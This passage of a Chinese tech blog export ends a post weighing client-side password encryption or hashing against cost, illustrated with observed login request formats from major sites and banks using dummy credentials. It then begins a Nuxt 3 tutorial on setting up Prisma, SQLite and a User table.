hash」，跟我這篇一開始設定的「在 client 端做非對稱式加密」有點不同，hash 會更安全一點，確保在 server 真的沒人知道你的密碼明文是什麼。\n總之呢，在 client 端先把密碼加密或是 hash，可以避免在日誌中不小心出現使用者的密碼明文，這個顯然是個額外的優點。\n加密還是 hash？ 文章開頭我有提到 hash 的狀況有些複雜，所以我先把情境設定在「對密碼做非對稱式加密」再傳輸，因為對上面我舉的那些例子而言，這兩種情境的差異不大。\n舉例來說，HTTPS 被拿到明文內容，無論你對密碼做了非對稱式加密還是雜湊，在攻擊者無法取得伺服器端密鑰的前提之下，都是拿不到明文密碼的。\n那為什麼 hash 的狀況有些複雜呢？\n假設我們在前端先把密碼 hash 過後再傳到後端，那後端是要直接存進去資料庫嗎？如果直接存進去資料庫，哪天資料庫的內容曝光，攻擊者就拿到這些 hash 過的密碼了。\n通常在有加鹽以及雜湊演算法夠強的前提之下，被拿到 hash 的密碼還是能保證一定的安全性，可是在這種情況下，反而變得很不安全。\n因為前端傳給後端的內容已經是 hash 過的了，所以攻擊者可以直接拿 hash 過的密碼進行登入，根本不用知道明文是什麼。雖然保護了明文，但失去了原本雜湊的安全性。\n因此如果要做 client side hashing，server side 收到後也要再做一次。如此一來，就算資料庫被偷走，攻擊者也沒辦法利用資料庫中的 hash 直接登入。\n有些人可能跟我一樣好奇：「做兩次 hash 不會更不安全嗎？」，我們可以看一下 Google 在 Modern password security for system designers 裡面怎麼說：\nHave the client computer hash the password using a cryptographically secure algorithm and a unique salt provided by the server. When the password is received by the server, hash it again with a different salt that is unknown to the client. Be sure to store both salts securely. If you are using a modern and secure hashing algorithm, repeated hashing does not reduce entropy.\n看起來是還好，問題不大。\n總之呢，看起來最安全的但也更複雜的解法就是 client side 先 hash 一次，然後丟到 server 的時候再 hash 一次存進資料庫，如此一來就可以保證：\nHTTPS 因為各種原因失效時，攻擊者無法取得明文密碼 在 Server 端，沒有任何人知道使用者的明文密碼 明文密碼不會因為人為失誤被記錄到 log 中 那如果真的比較好用，為什麼沒人在用？\n現實生活中，到底有誰在前端做 hash 或是加密？ 當我一開始碰到這個問題，講出「怎麼沒人在用」的時候，其實只是「我自己沒碰過有人這樣用」，但實際上我並不知道那些知名網站的登入是怎麼做的。\n因此呢，我就直接去看了幾個知名網站的登入機制，我們一起來看一下結果，為了方便觀看，我把跟帳號密碼無關的內容都拿掉了。\n我在測試的時候，基本上都是用 test 或是 test@test.com 搭配簡單的密碼如 1234 在測試，然後觀察 request 的內容。\n先來看一下 FAANG 吧！\nFacebook API 網址：https://zh-tw.facebook.com/login\n請求內容：\n1 2 email=test@test.com encpass=#PWD_BROWSER:5:1673256089:AbJQAJUvZZNvh2dZbeDqdu9dp7HWwyHOl3+0sCGjiHMMjvYdxJokpdHE/O+E5LIbnakRmDWQfV40ZaB31MaNXFYo1b+RI+LHh6MAdDPa4PJ+BesDp4u8B4F4diVQ+q7idbEhT5wTNaU= 沒想到 Facebook 就是有實作前端加密的網站！後面那段 Base64 並不是直接把密碼 Base64，而是把加密過的密碼做 Base64，解出來是這樣：\\x01²P\\x00\\x95/e\\x93o\\x87gYmàêvï]§±ÖÃ!Î\\x97\\x7F´°!£\\x88s\\f\\x8Eö\\x1DÄ\\x9A$¥ÑÄüï\\x84ä²\\x1B\\x9D©\\x11\\x985\\x90}^4e wÔÆ\\x8D\\\\V(Õ¿\\x91#âÇ\\x87£\\x00t3Úàò~\\x05ë\\x03§\\x8B¼\\x07\\x81xv%Pú®âu±!O\\x9C\\x135¥\nAmazon API 網址：https://www.amazon.com/ap/signin\n請求內容：\n1 email=test@test.com\u0026amp;password=1234 Apple API 網址：https://idmsa.apple.com/appleauth/auth/signin\n請求內容：\n1 {\u0026#34;accountName\u0026#34;:\u0026#34;test@test.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;1234\u0026#34;} Netflix API 網址：https://www.netflix.com/tw/login\n請求內容：\n1 userLoginId=test@test.com\u0026amp;password=1234 Google API 網址：https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute.\n請求內容：\n1 f.req=[[[\u0026#34;14hajb\u0026#34;,\u0026#34;[1,1,null,[1,null,null,null,[\\\u0026#34;1234\\\u0026#34;,null,true]]]] 看來 FAANG 裡面，只有 Facebook 是有實作的。\n接著我突然好奇起其他常用服務的登入有沒有做，底下貼結果。\nGitHub API 網址：https://github.com/session\n請求內容：\n1 login=test@test.com\u0026amp;password=1234 Microsoft API 網址：https://login.live.com/ppsecure/post.srf\n請求內容：\n1 login=test@test.com\u0026amp;passwd=1234 IBM cloud API 網址：https://cloud.ibm.com/login/doLogin\n請求內容：\n1 {\u0026#34;username\u0026#34;:\u0026#34;test@test.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;1234\u0026#34;} 看來有實作的是少數，那資安廠商呢？資安廠商自己有做嗎？\n資安廠商\nKaspersky API 網址：https://eu.uis.kaspersky.com/v3/logon/proceed\n請求內容：\n1 {\u0026#34;login\u0026#34;:\u0026#34;test@test.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;12345678\u0026#34;} 趨勢 API 網址：https://sso1.trendmicro.com/api/usersigninauth\n請求內容：\n1 {\u0026#34;email\u0026#34;:\u0026#34;test@test.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;12345678\u0026#34;} Tenable API 網址：https://cloud.tenable.com/session\n請求內容：\n1 {\u0026#34;username\u0026#34;:\u0026#34;test\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;1234\u0026#34;} Proton 這個應該不算資安廠商，但突然很好奇強調隱私的 Proton 是怎麼做的，一看發現好像很複雜。\n在登入的時候會先把 username 送過去，拿到一些看起來是 key 的東西。\nAPI 網址：https://account.proton.me/api/auth/info\n請求內容：\n1 {\u0026#34;Username\u0026#34;:\u0026#34;test@test.com\u0026#34;} 1 2 3 4 5 6 7 8 { \u0026#34;Code\u0026#34;:1000, \u0026#34;Modulus\u0026#34;:\u0026#34;-----BEGIN PGP SIGNED MESSAGE-----\\nHash: SHA256\\n\\nu9K5yr97L9VV2ijOSI62tJcewUiRhQa8qJa24baNpGyw0lf3JLiF4fxUHqTErwF9UdoxE0z4Kb147naphylBFddyKsjhzHNcxk2rBw9haiPxD69BrVYm0n+LVlPqmjXFF7btr1H7oqHGX4b4Dy9omL/KaZz/Dco2NEhw0UBhEZbTAs6Ch01ur9XLbSOI7yb6MRsqCehfy82gDTdbPtXvqQsQjg5XoC2Ib2qTYFaU/24mq/gOaMbVuAGX0hBYzr5NpN9ol2XCdHOLg28Xe90+kisg39VV04axy7Ndvh489dC1CxjcWSSpXd6cPJyOn/HH9aPeTZeucBllRGbPgwR6/w==\\n-----BEGIN PGP SIGNATURE-----\\nVersion: ProtonMail\\nComment: https://protonmail.com\\n\\nwl4EARYIABAFAlwB1j0JEDUFhcTpUY8mAAD1GwEAoC91QCSfXPEuWM13NZvy\\nvL9NQIABuSrVOvgJwMhUTnUBAPb4zbIdTYFOQNrPLvonJt2mmRNy4lGcW7uN\\n5yHzJ18J\\n=Oykn\\n-----END PGP SIGNATURE-----\\n\u0026#34;, \u0026#34;ServerEphemeral\u0026#34;:\u0026#34;DY6eRYM1bqYZZ5jzZFdWv88tKYP2PnS0y4A+f7/eqMXj8wB2VefV2kfIDrZ5AorWfDzBq4wMtNG2k5dzbT2qWppzpvltrSl2Nm4i8eWIRVxXWHl/46dGuPXFHUcXBNMP3XEQvft0YEbHOPO9Es0RZRaObV5XPFyx6kzOJxXc1tIt4PfbhODMfsAoy/yxt6eLN3HUiORCBOvzsH2sfG99Gx1YSAe3GL6g/K+bdg59eglueXRESoB0/VFRsvQevi9nVXx/JZNTG0U4BBUOlMjpYYMgEP6eQgZZ/09ZPYD3a2tW65mSnNt6lSDfwiKj02UuDqymTvj7mYm44T0SuAocwg==\u0026#34;, \u0026#34;Version\u0026#34;:4, \u0026#34;Salt\u0026#34;:\u0026#34;dI7OcD+K4rGPBA==\u0026#34;, \u0026#34;SRPSession\u0026#34;:\u0026#34;3fa6224285409b6af07c811971e05341\u0026#34; } 接著輸入密碼登入時，會送出如下的 request，看起來也很複雜：\n1 2 3 4 5 6 7 8 9 { \u0026#34;ClientProof\u0026#34;:\u0026#34;I9Nfd0Nd3OzODf2nt9zLxFHWogEwfRje8zjoeZnblyLfyzz23uXTjJ4qgRFomjIEEtZrlM1jTQa4wRIMGIIV7E6pMqq8c6wcc2tegP4Xt76S0EbnVtE1F9i0Wj46aCPUM0Mha3Zmgi9LKerrGlaftr2FBedjPFT9rPrbLqRQcFNMD33tn69gD/p28q4RAr3/7d/tz7TYhytD5oxCAUwrkqiZOi0kg//2mUJ9YNT2nWcgqUERoaU51NbNMcaPnMteEe1PlIJdiQbvNa5K07u8rk7itpBrGW2FP26bREp0UMTzNYM5HcDDkmp4dp9GoBjFJL9n0THUdt/oRRJ/Enj5WQ==\u0026#34;, \u0026#34;ClientEphemeral\u0026#34;:\u0026#34;D013N7FXYHylqMeWa6ctJIv3J4uF1hqodyYfw6O+Sj7MZOIB+wksfgk/nkXCmRxQhuSYwqwMJIpyFD3MEolOZAHMU2n6HQlxe9A4KbrE4gk3UiGwfgcZDmFejTmMMxfWhf4zO2Z1fBbohreqwwN0mz3AqqsfE5dsDh3LEfkiJB449YGZfHeUHyIzS1jTmnx/8l6uVSKwJDCJelVFYKMXrxVt0ltcGRoYD92MUj82kR0am+BN4+djHyYYXuwuIYArnTW4kDP3T2yCIAMVgZnFaUCc2gfynt40mQP4q87jmMELOl8TDIDo5iKyH4gJc/470qIuIyj4ffVLiZ7t8S+kcw==\u0026#34;, \u0026#34;SRPSession\u0026#34;:\u0026#34;3fa6224285409b6af07c811971e05341\u0026#34;, \u0026#34;Username\u0026#34;:\u0026#34;test@test.com\u0026#34;, \u0026#34;Payload\u0026#34;:{ \u0026#34;qcA_CRYU6gSyHWdn\u0026#34;:\u0026#34;c6UZSKPo4Sfm/3+DvQN72TTxyj+/TplKT9edDiUI5wMfGUsoJs9FGerOtkoW8T49r7KOvqHkzS2+M2v8ra7J9l5kSf5jgC9ZvgZ8Ja5Xgg02nxgAABydOirGLoL4htFsYVtwLrNg8NeSEanLwYLCVaSqkjANRJks0eaKpUOd8xRhCFtUH/GCbyg27oZfzDsqKXemKprOUsOh42NTqzEmruAkxs2x8mUsLy/vXptVAdaiJLrsSRqD0YBGjvOp4W2/0g6V2zfedJpJEzVwtSi1vXTC5bwxmEJlYdV9AiQECogAAJFxLQi7JjtmgFe4tNcv97JD0B8giZ6XS35swjz0vz0mOjVBUwmiDa8n54Y5kBaAoZe5pijdp2S4SOcRAknDIcD1nf0v7oSMOE9WtH/sa+XI1D2s5lFKo/iInf7r5R9src2hHFoy0b2XT0oCfLPwFX87yjaKbf7bbkjByx/3dOgzEliAkS6nHK+fmeDDVM4EoZqVSKZHLg3QTcg4DKaICyDsotALr2UqI/ARzkX4yhAXz5xHFaxl6hWAKLJPJcgk6il6oX0s0PCBNSY0Fi3vbQvXD4WalUx+LBNto6CUqeAIzVuAh8sCubzufoSORypE5WqfnuJzAlZ9sMEjaQycuRi497aV3jmjgx53UwO0OiZGxDTEMFBcov4P0g1blZ4vxmULhZU0RfdP31udLr6GTCAB90CM6Vk9w9CsYM+hmo3+JpEAtIVgLVVqcPikTbV+yaOJ1RknxBf3g06kTl0LQ+zBV6pG2rFVi8G4XT9L4FsIgxTNsl/ryzs8vJU7K+HvyE1Lp2pAXrfcju7TAIqK/FOXvp1c8Ay9O6d4fmd/PZalnRDv5mQ6Gmd6JSNzNh6i6AibBuF13w3OBaulY3FGNU/cH/AXLBIqjSzf/OySwkKkC9HBurSs3D0zqcH9BwUpmPEL8jbc8yPE+hPAim+tDo1BXCQNClxgGLaI6FXkuCiQ4AHiKsq0xs5b3WAFzcvBv1rc003RWxRegH/2teIooKU9w1kDPQRaK8/rIYe8u+BlBeZq4OwCXxx56JHfmTxtJwBi95KqsWzLGtY3ILcb+/XkzSRmE2TWbkW1IXzRsl8F6NSJj7JnHA3UrQf4hxuwbaYxpKJrcHuHc8e1wxqXrUSKooCOUxwSBgxvLLT37eaByNTxpfWomxIsH671wuydnmMedWyNIqyaMtxBORuiWUiG4jbMC2BjrVptXJ7VWigf3Vy5OQlMOyTx8tLWi1qZODYyywMBAvHYQlFfSqmIrm4y4dmK/srJE/+daEnNS+kWF48Jm/rQORO5AUwqWL+Lefg9pchcL1BnHOANcviO8pAkxLo8TiK7VLKI5/xUsZQoQSlhRt27zMF+sIv+exY375HApiY+a1VQ6OqE4Nvba7O8ETLoLFg4a8Aj+W8erXFHW5F0vVIRphAve9orM4QYnAmOigFAiLb0Pxx124wUjFR9s5oP98hAtNL/t+uGAXrb0oxiCfyHb9wa2Qb0x6o9FpuBIc5ZXId+cEXEvOdqhnUQ7ZuOi/fX81hlqgUaiD/A6P+zjAcREXdktd+hrhSXwCIKSBkp/mNymnalQKJkLaNVT+W2sOWqXxTSTIytCQx36xABcj1BXRApntob6Qvche8QJLTjzr9bDpn+Mo59N9PSU51DPIj5Avre6ChTHEQvjz9s1IM2XroBX/KFBnPj33aYQZyov4uxrVXxic+fiY+fLMF8x1ut/eNWeQU6fn+rU5PEGQ9bbAsjVBZYA5H93ROhO5lnSxoEk5PHkgQ9WpxueckPjJIUGAs+O8QMRFicccfKjhNIc32rXTqbVqLyoz62riDn8Y18MUBoeI8ORyqZOKEEBFsi5dwqoq8t82NFdx5LFjsLdk4RmMXZ2uygNLk8gH2Yyfu3iOQS2bKtNCW42Xmo66Xu5kt8NwAneYQK0mTn6HUv94K10J4hY+Q=\u0026#34; } } 補充：經討論串有人提醒後發現這是一個叫做 SRP（Secure Remote Password）的協議，Proton 有提供一個 ProtonMail Security Features and Infrastructure，裡面有記錄他們的安全措施，就有講到這個機制。\n看起來滿複雜要花不少時間研究，先放著，有興趣的可以參考：SRP — 更健全的登入及資料傳輸保護協議\n雖然更安全，但成本應該又更高了。\n交易所與銀行 看完上面案例發現有做的是少數，因此我好奇更注重安全的加密貨幣交易所與傳統銀行有沒有做。\nBinance API 網址：https://accounts.binance.com/bapi/accounts/v2/public/authcenter/login\n請求內容：\n1 2 3 4 5 { \u0026#34;email\u0026#34;:\u0026#34;test@test.com\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;fe2e6b4138fcd7f27a32bc9af557d69a\u0026#34;, \u0026#34;safePassword\u0026#34;:\u0026#34;d404559f602eab6fd602ac7680dacbfaadd13630335e951f097af3900e9de176b6db28512f2e000b9d04fba5133e8b1c6e8df59db3a8ab9d60be4b97cc9e81db\u0026#34; } Coinbase API 網址：https://login.coinbase.com/api/v1/authenticate-credentials\n請求內容：\n1 {\u0026#34;email\u0026#34;:\u0026#34;test@test.com\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;1234\u0026#34;} kraken API 網址：https://www.kraken.com/api/internal/account/settings/tfa\n請求內容：\n1 {\u0026#34;username\u0026#34;:\u0026#34;test\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;1234\u0026#34;} 玉山銀行 API 網址：https://ebank.esunbank.com.tw/fco/fco08001/FCO08001_Home.faces\n請求內容：\n1 2 3 loginform:custid=A0000... loginform:name=mxagZmaqygDx0XX6784Svw==__NgZQcFfAx+lQmPza2eNpOA== loginform:pxsswd=8,lIRnuUxw/yStOt9QIYG2U3Gn2XkG03x4Ey/UU6JGtsbUxfRXoAv9CjE3EWerDN3tfx3dD/B3ChLAPMSG2BA3jMXUCZC06y8UbQ5isKc9fCWZSSZAWWcOmJ7LdXw1ZhjV55hpw1upvAr9WEmZ0XF6x7if+dBxJ4KZ00d83qA9eA+3VaSk+JLhN8/CFBfTKTfJEs3PDNsm12XzRUBb4YE1aPQosVX10mdvh3zY5lmkrKuq8gnuImEf3oLOk4EF3eVpr6jJiFzMKlHybvGdtKYS25+pgTS68wn3v023barbSmgivcv5atm0XsyXWDY2dKEtdQz+7A6R+AB0bExbQlRjqQ== 國泰世華 API 網址：https://www.cathaybk.com.tw/MyBank/Quicklinks/Home/NormalSignin\n請求內容：\n1 2 3 CustID=A000... UserId=DC0C6E52BE2A2354C53401207F220F1B Password=8cf5e1977f149ed0362629007a7f91d0efc7b12cb1895ba701c528a12b38d12f8148ca03ee671fe25d2a3a807be980f7728566e359a675734ce046899b147658388bb60f9b900e2ccc9adac280b54b5f2e28cb7eee1b634d0e1ed1c0c0c598c350f61eb003405559331a7f047add7289466bf42cfd5b9e774a1fa116af4fd7050adb8f174d42a8e2098a014a788bd2ffae3bf4ff7a8d8d7e2e8068402fda395da41be6e5d32f2d32cbee2afc26e82c58b60357b5cb186a3b9cf69df2deb9da8c9fde45337935180cb4e177109413d7a758d38bfc8334a4509d8d8fb6a37080f0e0086b4a5ef68f7809ca2ef97183b7f66d996873bb7dbfcee61d2da424b8b968 中國信託 API 網址：https://www.ctbcbank.com/IB/api/adapters/IB_Adapter/resource/preLogin\n請求內容：\n1 2 3 4 5 6 7 { \u0026#34;rqData\u0026#34;: { \u0026#34;custId\u0026#34;: \u0026#34;A00....\u0026#34;, \u0026#34;pin\u0026#34;: \u0026#34;878dbee38bbb4d77a30ee128f55f7bfe2169e45380d62a75453d3ca175e8ce8b|43d0499147b62adeec4eef3c77d33171b4569d0bdf7bbbe2b8b9bde3d30a26aba69aadfb28dfbaa9a997a0ccf668aaab0b6da582275175272172569a58a60bbfc5ac3a8c6862ce31f86247d7c1adf307e363c0f251fb88c4d39afa6ed0ca0a49e053f4f90000fa77b4e78beaead72ebdf52a13ecb4f20ae9a532947fad8156d5ec69d6763243364e71659079e469d1e01d0c384b0c71f4e9e524890227d82a51a340ef0b48638e05e347d75cb93d4a825a2bce6a90ef47f512351ee2d0d1ea17fb8afd521e427578603ea775191711f81d8dcb18e46b72daf3a49a60e50d12d3887e3bafab3758730f7fb0276373ebe1da01a03162ec8e73a202091a51b7f88d\u0026#34;, \u0026#34;userId\u0026#34;: \u0026#34;bfcdb9b2d6896a3bfb4a6542e8fb2689486d000b11bdc0c7bc336a6534aec74c|1b1a758bb26702bc0ac7cd660da2a72866f2cfdcf3668f2d39a5f8b006854f52a08f418b0a460b36374f95b7a310d73ea9994788698041f524ecd1f153448ab5d51f901a9a08ac2a9ee04c5c273ecb9d4ec1b6a62e9696c6126271e2f8c334fe17ce8b8538139363b90be75c1130cb251ec240bd26c920b52f5be9fc59094ce7d935d826242d69dc1ff7047a5abbf11d3c7de639a14bb10230912903cd948c05b3b3cb0cdb100f979640e291774e623a7109bde7b55bb8a6a373c0ca12820b072132ea61c845e60e26d09c7ee0fe23f7de286cbccb067a86fd1985c5b455f9ae46ce24dc8f52bcb05c205d6a462345162ae82c35e045bf3fd43a297c3edcfe17\u0026#34; } } 美國銀行 API 網址：https://m.globalcard.bankofamerica.com/pkmslogin.form\n請求內容：\n1 2 username=fcc63767-1a43-4cc6-8c3e-1346350b5274 password=12345678 新加坡星展銀行 API 網址：https://internet-banking.dbs.com.sg/IB/Welcome\n請求內容：\n1 2 USER_LOGON_NAME=test123 ENCRYPTED_PIN_BLOCK=A8C48B7572A1A53C5A66E9B43365027C7FBF14BF461F480A46781E49648A8F70271A29C374F86FCD55A76ED17B2284B47C799B74475F29749D68631FF7E322177A21EEE8C41D8950638A2828C34A2653D7C9F69F5DA568E42D64CE89FCE8F024217B235835E6F8BC3C536F56361EDF459AFCE9A512BDBACAB2D25423209996C2E84A18EA8446685DAF9FAD4B1D6D8DF0F378EC27D9A81AD4D1A2B91BA3CFD838140A9BD48AD8D38D33B0093110BD1CA2C76F3DE4CBD969A9B0260DB890E9B1A99DC1193BFE9A1EDB3E56F71CB1CD8630558B242B040F733A4A40B2E17DE6DA03A58DEC8BB12DA87BB25971E2DBE5AF7AE6112266A3F9027B449BDF46D8DC0A1A 結論 在隨機想到的 20 個網站中，有 7 個有在前端做加密或是 hash（我懶得看是哪個了，總之有做事就對了），名單是：\nFacebook Proton Binance 玉山銀行 國泰世華 中國信託 新加坡星展銀行 雖然說 35% 看起來很高，但那是因為銀行佔了大多數，一般網站則是很少實作這個機制。\n寫到這邊，可以來下結論了。\n第一個結論是： 「在 client 端傳送密碼前先把密碼加密或是 hash，確實能夠增加安全性」\n理由是做了以後，能夠達成以下事項：\nHTTPS 因為各種原因失效時，攻擊者無法取得明文密碼 在 Server 端，沒有任何人知道使用者的明文密碼 明文密碼不會因為人為失誤被記錄到 log 中 以上都是沒有在 client 加密或是 hash 時做不到的。\n第二個結論是： 「確實有些大公司有做這個機制，但是非大多數，不過在銀行業似乎是主流」\n這個結論上面有貼完整的資料了，一般的網站很少做這個機制，但還是有人做。\n第三個結論是： 「雖然從技術上來看能夠增加安全性，但實際上是否實作，仍然要考慮其他因素」\n這因素就是我前面提過的「可能性」還有開頭我講先不談的「成本」。\n若是真的比較安全，為什麼一般網站不會實作這個機制？\n或許是因為覺得 HTTPS 被攻破的可能性太低，低到可以忽略不計（我相信這是大多數留言的人覺得不需要做的理由，我也同意這點），也或許是成本太高，會增加程式碼複雜度；若是採用加密的方案，也會消耗更多運算的資源在加解密上面，這也是成本。\n這就是我覺得應該講清楚的地方。\n在前端先做 hash 或是加密，它確實是有優點的，不是多此一舉，也不是沒有意義，更不是讓系統變得更危險。\n但這不代表每個系統都該實作這個機制，因為它帶來的效益或許沒有成本高，這個端看各個公司的考量。對大部分的公司來說，與其為了 HTTPS 失效這個極低的可能性去投入成本，不如把時間花在加強其他登入環節的安全性（例如說 2FA 啦，或是不同裝置登錄警告等等），帶來的效益會更高。\n有些服務還會選擇把整包 request 都加密，而非只有密碼，這個又更安全但是成本又更高，而且 debug 很不方便。雖然說既然加密做在 client 端，攻擊者一定有辦法逆向這個機制，看出是怎麼做的，但這不代表這些機制沒幫助。\n舉例來說，假設我有個搶票 App 不想讓別人知道 API 怎麼呼叫，於是就實作了一個超複雜的加解密機制，儘管高手還是可以做逆向工程，寫出一個搶票機器人，但這個機制增加了他的時間成本以及對技術的要求。\n以技術上來說，就算理論上一定會被破解，這些機制還是有意義的，它的意義在於增加破解難度，加殼、混淆都是一樣的，不會因為「在 client 端的東西一定會被看穿」而不去做這些機制。\n重點在於你想保護的商業邏輯的價值，有沒有高到你需要付出這些成本去做額外的安全機制。\n最後，如果你需要一個條列式的簡單結論，會是：\n無論如何，一定要先用 HTTPS 在前端先把密碼做加密或是 hash 後再傳送，能夠增加安全性，但同時也帶來不少成本 如果你是銀行或需要同等安全性，再來考慮要不要做這個，否則極大多數的狀況下，你不需要這個機制就夠安全了，資源投入在其他地方的效益會更大 若是對這個結論有不同意見，或是有在文章中發現哪些邏輯錯誤或技術錯誤，歡迎留言指正與討論，感恩。\n補充一下，這篇大多數從技術面來看，除此之外還可以從法遵面或是資安的實務經驗來看，但這些面向我就零經驗了。許願一下有相關經驗的人出來指點迷津，或許會有不同觀點。\n","date":"2023-01-17T00:00:00Z","image":"https://live.staticflickr.com/65535/52634831533_259566b84f_o.jpg","permalink":"https://wayneblog.ga/2023-01-17/why-encrypt-in-client/","title":"網站前端打 API 時把密碼加密，有意義嗎？"},{"content":" 參考網站\n參考網站\n參考網站\n大家經過 【Nuxt3】開箱即用的 Nuxt3 玩轉筆記 這篇文章，應該對於 Nuxt 3 有初步的理解，接下來我們將進入實戰部分，我將會以 Nuxt 3 來實作部落格網站，讓已經註冊的使用者可以在網站上發布文章，實作這個網站的程式碼可能不會講解得非常仔細，但一些實務開發上會需要注意的細節我會把個人經驗做一個紀錄，大家可以再參考看看，文末也都會附上完整的範例程式。接下來，讓我們開始吧！\n資料庫與會員系統 資料庫 (Database) 這篇文章實作的部落格，會把會員與文章等資料儲存於伺服器的資料庫之中，大家可以選擇自己習慣或合適的資料庫來做儲存。為了方便及後續的展示，我最終決定使用 Prisma 搭配本地的 SQLite 來當作儲存體，讓大家測試時不用再煩惱怎麼架設資料庫，可以快速的執行範例程式碼。\n你可以在自己的 Nuxt 專案或從新專案開始進行，若你已經有自己的資料庫，也可以直接跳過此段介紹後續實作自己的後端 API 來接續我們的實作系列。\n安裝 Prisma Prisma 操作起來很像 ORM (Object-Relational Mapping)，但實際上依據官網的說明，其實不大依樣，Prisma 透過撰寫並根據 Schema 來建立或操作資料庫，在進行 CRUD 的操作時，都是透過 Prisma Client 進行，這也是最方便的地方，此外也支援多種資料庫的來源，只要操作 Model 就可以映射到資料庫的資料，不再需要寫 SQL，在一些情境之下是非常方便的。\n首先，使用 NPM 安裝 prisma 與 @prisma/client\n1 2 3 npm install -D prisma @prisma/client # or # yarn add -D prisma @prisma/client 打開終端機 (Terminal) 於 Nuxt 專案目錄中， 使用下列指令，初始化一個 Prisma 的 Schema。\n1 npx prisma ini 初始化完成後，會建立一個 schema.prisma 檔案。\n./prisma/schema.prisma 檔案內容如下，這裡就是定義我們資料庫位置與 Schema 的地方，之後我們就可以透過 Prisma 的 Client 使用 ORM 來操作資料庫。\nprisma/schema.prisma 1 2 3 4 5 6 7 8 9 10 11 // This is your Prisma schema file, // learn more about it in the docs: https://pris.ly/d/prisma-schema generator client { provider = \u0026#34;prisma-client-js\u0026#34; } datasource db { provider = \u0026#34;postgresql\u0026#34; url = env(\u0026#34;DATABASE_URL\u0026#34;) } 我們調整 ./prisma/schema.prisma 檔案內容，將 datasource 替換為 SQLite 並儲存在本地的 ./dev.db。\n1 2 3 4 datasource db { provider = \u0026#34;sqlite\u0026#34; url = \u0026#34;file:./dev.db\u0026#34; } 你也可以將 provider 替換為 PostgreSQL 或 MySQL 等，可以參考這裡，但要注意可能後面定義的 Schema 語法會略微不同。\n接下來我們定義一個 User 的資料表，在 schema.prisma 撰寫如下：\n1 2 3 4 5 6 7 8 9 10 11 12 model User { id String @id @default(uuid()) providerName String? providerUserId String? nickname String @default(\u0026#34;User\u0026#34;) email String @unique password String? avatar String? emailVerified Boolean @default(false) createdAt DateTime @default(now()) updatedAt DateTime @updatedAt } 這張 User 資料表，將用作於部落格的登入使用者做使用，也可以視為是會員系統使用的資料表，大家也可以依據需求來擴增欄位，以下稍微講述一下各個欄位將作為何用。\nid: 預設為 UUID，為使用者的唯一識別。 providerName: 作為第三方登入的供應商記錄使用，例如該名使用者使用 Google OAuth 註冊登入，我會在欄位就會填上 google。如果為空值 (null) 表示使用者用電子信箱註冊登入。 providerUserId: 與 providerName 搭配使用，第三方供應商通常也會有一組專屬於使用者的 Id，以此我們就可以來比對登入的是哪位使用者。如果為空值 (null) 表示使用者用電子信箱註冊登入。 nickname: 使用者暱稱，預設值為字串 User。 email: 使用者登入的電子信箱，這裡我將欄位設定為 @unique 表示，電子信箱是系統中唯一。 password:使用者密碼的雜湊值，如果使用第三方註冊登入，則該欄位為 空值 (null)。 avatar: 使用者的頭像，存放圖片網址。 emailVerified: 布林值，預設為 false，表示使用者的電子信箱是尚未通過驗證。 createdAt: 使用者建立時間，預設為插入該筆資料的時間。 updatedAt: 使用者更新個人資料的時間，預設為更新該筆資料的時間。 ./prisma/schema.prisma 檔案內容看起來如下：\nprisma/schema.prisma 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // This is your Prisma schema file, // learn more about it in the docs: https://pris.ly/d/prisma-schema generator client { provider = \u0026#34;prisma-client-js\u0026#34; } datasource db { provider = \u0026#34;sqlite\u0026#34; url = \u0026#34;file:./dev.db\u0026#34; } model User { id String @id @default(uuid()) providerName String? providerUserId String? nickname String @default(\u0026#34;User\u0026#34;) email String @unique password String? avatar String? emailVerified Boolean @default(false) createdAt DateTime @default(now()) updatedAt DateTime @updatedAt } 當我們調整好 schema 後，就可以執行下列指令，來初始化資料庫，Prisma 會依照 schema.prism 來幫我們建立對應的資料表。\n1 npx prisma db push 初始化完畢後，你可以登入你的資料庫查看是否建立成功，也可使用 Prisma 提供的 Prisma Studio 來快速的檢視與操作資料庫內的資料。Prisma Studio 已經內建在 prisma 套件中，執行以下指令後，就會啟動一個 Web 服務，如 http://localhost:5555，我們就可以在網頁中查看資料庫內的資料囉！\n1 npx prisma studio 可以在 Prisma Studio 看到我們建立的 User 資料表，也將是我們稍後使用 Prisma 操作 ORM 所對應的 User Model。\n最後記得執行下列指令來產生 Prisma Client，這樣我們就可以在 Nuxt 3 中使用 Prisma Client 操作資料庫囉！\n1 npx prisma generate Nuxt 3 操作 Prisma Client 建立一個使用者至資料庫 我們接下來就能使用如下程式碼建立 Prisma Client，後續可以用來來操作 Model，更多的 Prisma Client API 可以參考官方文件。\n1 2 3 import { PrismaClient } from \u0026#39;@prisma/client\u0026#39; const prismaClient = new PrismaClient() 我們建立一隻 Server API，新增 ./server/api/test-create-user.get.js，用來測試收到請求後建立一個測試使用者，詳細的程式碼如下：\nserver/api/test-create-user.get.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import { PrismaClient } from \u0026#39;@prisma/client\u0026#39; const prismaClient = new PrismaClient() export default defineEventHandler(() =\u0026gt; { const user = prismaClient.user.create({ data: { providerName: null, providerUserId: null, nickname: \u0026#39;Ryan\u0026#39;, email: \u0026#39;ryanchien8125@gmail.com\u0026#39;, password: \u0026#39;這裡要放密碼的雜湊值\u0026#39;, avatar: \u0026#39;\u0026#39;, emailVerified: true } }) return user }) 當我們送出 /api/test-create-user 後，後端會使用 Prisma Client 操作 User Model，我們就能使用 ORM 來建立出使用者的資料庫記錄。\nNuxt 3 使用者註冊帳號 我們將 【Nuxt3】開箱即用的 Nuxt3 玩轉筆記 這篇文章，所串接的 Google OAuth 及 Cookie 做一個結合，讓使用者透過 Google Auth 登入後可以自動的註冊建立使用者或登入產生 Access Token。\n./server/api/auth/google.post.js 程式碼如下：\nserver/api/auth/google.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 